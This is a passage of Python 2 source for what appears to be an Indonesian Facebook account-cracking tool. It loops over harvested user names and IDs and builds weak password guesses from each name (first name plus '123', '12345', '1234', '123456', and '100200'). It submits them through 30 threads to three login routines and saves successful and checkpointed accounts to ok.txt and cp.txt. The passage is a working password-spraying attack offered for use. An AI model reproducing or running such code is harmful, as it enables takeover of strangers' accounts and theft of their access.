            print '\n %s[%s~%s] jangan kosong bro'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] saved OK   -> ok.txt'%(O,N)
            print ' [%s+%s] saved CP   -> cp.txt'%(O,N)
            print '\n [%s!%s]  you can turn off cellular data to pause the crack process\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__mking__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"123456", "100200"]
                        else:
                            pwx = [
                             name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"123456", "100200"]
                        __mking__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            saved(ok,cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] saved OK   -> ok.txt'%(O,N)
            print ' [%s+%s] saved CP   -> cp.txt'%(O,N)
            print '\n [%s!%s]  you can turn off cellular data to pause the crack process\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__mking__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [
                             name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"123456", "100200"]
                        else:
                            pwx = [
                             name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"123456", "100200"]
                        __mking__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            saved(ok,cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] Total Ok Account seve to -> ok.txt'%(O,N)
            print ' [%s+%s] Total Cp Account seve to-> cp.txt'%(O,N)
            print '\n [%s!%s] you can turn off cellular data to pause the crack process\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__mking__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        name, uid = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"123456", "100200"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345", xz[0]+"1234", xz[0]+"123456", "100200"]
                        __mking__.submit(self.__mfb__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            saved(ok,cp)

        else:
            print '\n %s[%s~%s] input yang bener'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    Comments()
